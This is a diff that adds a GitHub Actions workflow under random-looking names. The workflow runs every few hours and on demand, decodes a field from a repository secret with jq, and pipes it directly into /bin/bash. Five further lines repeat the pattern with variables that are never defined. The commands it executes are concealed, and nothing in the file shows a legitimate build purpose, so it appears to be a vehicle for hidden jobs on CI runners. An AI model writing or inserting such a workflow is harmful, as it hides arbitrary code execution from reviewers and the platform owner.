@@ -1,0 +1,23 @@
+name: caohong19870101
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caohong19870101
+        env:
+          ur6281: ${{ secrets.ur6281 }}
+        run: |
+          echo $ur6281 | jq -r .k51 | /bin/bash
+          echo $h60 | jq -r .ejd2 | /bin/bash
+          echo $tgtwe11913 | jq -r .saj4 | /bin/bash
+          echo $vwnbo64253 | jq -r .yk81 | /bin/bash
+          echo $mvz7 | jq -r .g9 | /bin/bash
+          echo $tfkng8376 | jq -r .ttlu60357 | /bin/bash
+
